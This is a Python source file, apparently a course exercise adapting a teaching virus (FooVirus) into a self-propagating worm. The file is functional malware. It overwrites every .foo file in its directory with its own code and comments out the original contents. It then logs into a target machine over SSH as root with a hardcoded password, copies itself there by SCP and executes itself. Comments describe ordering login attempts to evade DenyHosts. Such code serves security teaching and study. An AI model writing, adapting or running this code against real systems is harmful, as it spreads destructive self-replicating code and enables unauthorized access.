#!/usr/bin/env python3

##   original - FooVirus.py
##   modified - 1805004_1.py (Converted to FooWorm.py)
##   Author: Avi kak (kak@purdue.edu)
##   Date:   April 5, 2016; Updated April 6, 2022

##   modified by: Syed Jarullah Hisham
##   Modification date: July 30, 2023

import sys
import os
import glob
import random
import paramiko
import scp
import select
import signal


print("""\nHELLO FROM FooWorm\n\n
This is a demonstration of how easy it is to write
a self-replicating program. This virus will infect
all files with names ending in .foo in the directory in
which you execute an infected file.  If you send an
infected file to someone else and they execute it, their,
foo files will be damaged also. We will convert it to worm.\n\n""")

file = open(sys.argv[0], 'r')
TOTAL_LINES = len(file.readlines()) + 1
file.close()

USERNAME = 'root'
PASSWORD = 'mypassword'
ATTACKED_IP_ADDRESSES = ['172.17.0.3']
TIMEOUT = 10

for target_file in glob.glob("*.foo"):
    IN = open(sys.argv[0], 'r')
    virus = [line for (i,line) in enumerate(IN) if i < TOTAL_LINES]
    IN = open(target_file, 'r')
    all_of_it = IN.readlines()
    IN.close()
    if any('fooworm' in line for line in all_of_it): continue
    os.chmod(target_file, 0o777)
    OUT = open(target_file, 'w')
    OUT.writelines(virus)
    all_of_it = ['#' + line for line in all_of_it]
    OUT.writelines(all_of_it)
    OUT.close()

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1                                # for demonstration

def get_new_usernames():
    if debug: return [USERNAME]          # need a working username for debugging
    return 0

def get_new_passwds():
    if debug: return [PASSWORD]          # need a working username for debugging
    return 0

def get_fresh_ipaddresses():
    # Provide one or more IP address that you
    # want `attacked' for debugging purposes.
    if debug: return ATTACKED_IP_ADDRESSES
    return 0


# For the same IP address, we do not want to loop through multiple user names and passwords
# consecutively since we do not want to be quarantined by a tool like DenyHosts at the other end.
# So let's reverse the order of looping.
while True:
    usernames = get_new_usernames()
    passwds =   get_new_passwds()
    ip_addresses = get_fresh_ipaddresses()

    # First loop over passwords, then names and finally chosen ip addresses
    for passwd in passwds:
        for user in usernames:
            for ip_address in ip_addresses:
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=TIMEOUT)
                    print("\nconnected\n")

                    # Let's make sure that the target host was not previously infected:
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error:
                        print(error)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" % str(received_list))
                    # if ''.join(received_list).find('fooworm') >= 0:
                    #     print("\nThe target machine is already infected\n")
                    #     continue

                    scpcon = scp.SCPClient(ssh.get_transport())

                    # Now deposit a copy of 1805004_1.py at the target host:
                    scpcon.put(sys.argv[0])
                    scpcon.close()

                    # Now run the worm on attacked machine
                    transport = ssh.get_transport()
                    channel = transport.open_session()
                    os.chmod(target_file, 0o777)
                    channel.exec_command('python3 '+sys.argv[0])

                    print("\n\nRunning worm executed successfully")

                except:
                    continue
    if debug: break
